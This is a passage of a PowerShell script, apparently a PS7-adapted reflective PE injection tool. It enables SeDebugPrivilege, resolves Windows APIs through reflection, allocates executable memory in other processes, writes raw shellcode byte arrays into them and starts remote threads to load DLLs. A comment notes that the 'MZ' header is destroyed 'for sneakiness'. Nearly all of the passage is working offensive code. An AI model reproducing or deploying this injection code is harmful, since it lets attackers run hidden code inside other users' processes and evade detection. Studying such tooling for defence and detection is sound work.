        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, 'Run')
        #$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ################################################################################################
        #                              END ADAPTED TO PS7	                                       #
        ################################################################################################
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        #$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            #Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $SystemAssembly=[Reflection.Assembly]::LoadFile('C:\windows\Microsoft.NET\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\system.dll')
        ################################################################################################
        #                              END ADAPTED TO PS7                                              #
        ################################################################################################
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode" #todo need to detect if already set
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    # PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        # Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
        
        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        
        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
